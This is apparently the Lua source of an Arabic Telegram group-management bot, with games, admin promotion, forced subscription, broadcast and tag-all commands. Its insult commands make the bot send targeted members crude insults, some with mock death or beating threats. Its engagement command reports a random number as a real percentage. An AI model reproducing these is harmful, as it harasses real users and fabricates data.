⌁︙لعبة الرياضيات ↫ رياضيات
⌁︙لعبة الانكليزيه ↫ انكليزيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]], 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     Source TRON     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevAbd0 = (DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAbd:incrby(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevAbd0)
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
DevAbd:del(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source TRON     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevAbd:sadd(TRON..'Abd:AbdConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا يوجد ادمنيه ليتم رفعهم\n⌁︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم رفع '..num..' من الادمنيه \n⌁︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
--     Source TRON     --
if text == 'غادر' and SudoBot(msg) then
if DevAbd:get(TRON.."Abd:Left:Bot"..TRON) and not SecondSudo(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعه \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, TRON)
DevAbd:srem(TRON.."Abd:Groups",msg.chat_id_)
end
--     Source TRON     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source TRON     --
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbd:get(TRON..'Abd:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgs(msguser)..'\n⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source TRON     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbd:setex(TRON..'DevAbd4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '⌁︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
if DevAbd:get(TRON..'Abd:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbd:get(TRON.."Abd:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"⌁︙الاشتراك الاجباري مفعل \n⌁︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
DevAbd:setex(TRON..'DevAbd4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"⌁︙لاتوجد قناة لتفعيل الاشتراك\n⌁︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbd:del(TRON..'Abd:ChId')
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbd:del(TRON..'Abd:ChId')
Dev_Abd(msg.chat_id_, msg.id_, 1,"⌁︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if DevAbd:get(TRON..'Abd:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbd:get(TRON.."Abd:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "⌁︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "⌁︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source TRON     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function TRONTEAM(extra,result,success)
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevAbd:smembers(TRON.."Abd:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevAbd:smembers(TRON.."Abd:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n⌁︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TRONTEAM)
end
end
--     Source TRON     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevAbd:set(TRON..'Abd:viewget'..msg.sender_user_id_,true)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source TRON     --
if text == "السورس" or text == "سورس" then 
local text =  [[
Welcome To Source
⌁︙TRON TEAM
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)

⌁︙[Exp Source](https://t.me/Exp_Dev)

⌁︙[Developer](https://t.me/LEEEE9)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Tws TRON](https://t.me/IQA_bot)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source TRON     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevAbd:get(TRON.."Abd:Kick:Me"..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbd:set(TRON..'yes'..msg.sender_user_id_, 'delyes')
DevAbd:set(TRON..'no'..msg.sender_user_id_, 'delno')
local Text = '⌁︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source TRON     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbd:set(TRON.."Abd:Kick:Me"..msg.chat_id_, true)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل امر اطردني'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbd:del(TRON.."Abd:Kick:Me"..msg.chat_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل امر اطردني'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source TRON     --
if text == "نزلني" and ChCheck(msg) then
if DevAbd:get(TRON.."Abd:Del:Me"..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbd:set(TRON..'yesdel'..msg.sender_user_id_, 'delyes')
DevAbd:set(TRON..'nodel'..msg.sender_user_id_, 'delno')
local Text = '⌁︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source TRON     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbd:set(TRON.."Abd:Del:Me"..msg.chat_id_, true)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل امر نزلني'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbd:del(TRON.."Abd:Del:Me"..msg.chat_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل امر نزلني'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source TRON     --
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل امر تاك للكل'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل امر تاك للكل'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevAbd:get(TRON..'Abd:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbd:get(TRON..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAbd:get(TRON..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source TRON     --
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevAbd:get(TRON..'Abd:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbd:get(TRON..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAbd:get(TRON..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     Source TRON     --
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevAbd:get(TRON..'Abd:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevAbd:get(TRON..'Abd:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevAbd:get(TRON..'Abd:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n⌁︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n⌁︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n⌁︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     Source TRON     --
if text == "معرفي" and ChCheck(msg) then
function get_username(extra,result,success)
text = '⌁︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '⌁︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source TRON     --
if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙@HMSEBOT', 1, 'md') end
if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevAbd:get(TRON..'Abd:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevAbd:get(TRON..'Abd:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "ايديي" and ChCheck(msg) then Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbd:del(TRON..'Abd:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevAbd:del(TRON..'Abd:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source TRON     --
if text == "المطور" then 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbd:get(TRON.."Abd:ChId"))
local GetInfo = JSON.decode(Check)
local DevCh1 = GetInfo.result.username
local DevText = DevAbd:get(TRON.."DevText")
if DevAbd:get(TRON.."Abd:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Dev_Abd(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..DevCh, 1, "md")
end
end,nil)
end 
--     Source TRON     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
if not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function TRONTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1823672541) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevAbd:sismember(TRON.."Abd:AbdConstructor:"..msg.chat_id_,result.id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local TRONTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md') 
local TRONTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abd(msg.chat_id_, result.id_, 1,''..TRONTEAM[math.random(#TRONTEAM)], 1, 'html') 
else  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,TRONTEAM)
end
end
--     Source TRON     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(TRON) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1823672541) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevAbd:sismember(TRON.."Abd:AbdConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local TRONTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md') 
local TRONTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abd(msg.chat_id_, result.id_, 1,''..TRONTEAM[math.random(#TRONTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(TRON) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abd(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local TRONTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md') 
local TRONTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abd(msg.chat_id_, result.id_, 1,''..TRONTEAM[math.random(#TRONTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(TRON) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abd(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local TRONTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md') 
local TRONTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Abd(msg.chat_id_, result.id_, 1,''..TRONTEAM[math.random(#TRONTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source TRON     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function TRONTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local TRONTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md') 
local TRONTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Abd(msg.chat_id_, result.id_, 1,''..TRONTEAM[math.random(#TRONTEAM)], 1, 'html') 
else  
